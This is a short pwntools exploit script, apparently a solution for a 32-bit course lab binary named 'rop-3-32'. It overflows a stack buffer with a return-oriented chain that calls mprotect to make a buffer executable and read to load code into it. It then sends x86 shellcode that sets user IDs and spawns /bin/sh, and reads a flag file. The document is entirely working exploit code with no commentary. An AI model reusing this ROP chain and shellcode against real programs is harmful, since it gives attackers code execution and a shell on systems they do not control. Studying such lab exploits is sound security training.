from pwn import *

shell = '1\xc0\xb0\xca\xcd\x80\x89\xc3\x89\xc11\xc0\xb0\xcc\xcd\x801\xc0Phn/shh//bi1\xc9\x89\xca\x89\xe3\xb0\x0b\xcd\x80'

p = process("./rop-3-32")

memprotect = p32(0x8048360)
read = p32(0x8048370)
buff = p32(0x804a060)
buff0 = p32(0x804a000)
pop3 = p32(0x080485a8)

payload = "A"*156 + memprotect + pop3 + buff0 + p32(0x1000) + p32(0x7) + read + buff +  p32(0x0) + buff + p32(0x100)
print payload
p.sendline(payload)

p.sendline(shell)
p.sendline("cat /home/labs/week5/rop-3-32/flag")

print p.recv(timeout = 1)
